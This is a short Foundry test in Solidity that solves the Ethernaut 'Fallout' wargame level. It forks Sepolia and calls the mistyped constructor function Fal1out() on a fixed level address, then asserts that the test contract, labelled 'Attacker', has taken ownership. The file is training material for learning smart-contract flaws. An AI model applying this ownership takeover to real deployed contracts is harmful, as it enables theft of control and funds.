// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../src/levels/02-Fallout/Fallout.sol"; // test/Billy/ folder

contract ContractTest3 is DSTest {
    Fallout level2 =
        Fallout(payable(0x1789a48B2f04DE973fe8e25E1860c6a4bd044035));

    function setUp() public {
        Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
        vm.createSelectFork(vm.rpcUrl("sepolia"));

        vm.label(address(this), "Attacker");
        vm.label(
            address(0x1789a48B2f04DE973fe8e25E1860c6a4bd044035),
            "Ethernaut02"
        );
    }

    function testEthernaut02() public {
        level2.owner();
        level2.Fal1out();
        level2.owner();

        assert(address(this) == level2.owner()); // Attacker
    }

    receive() external payable {}
}
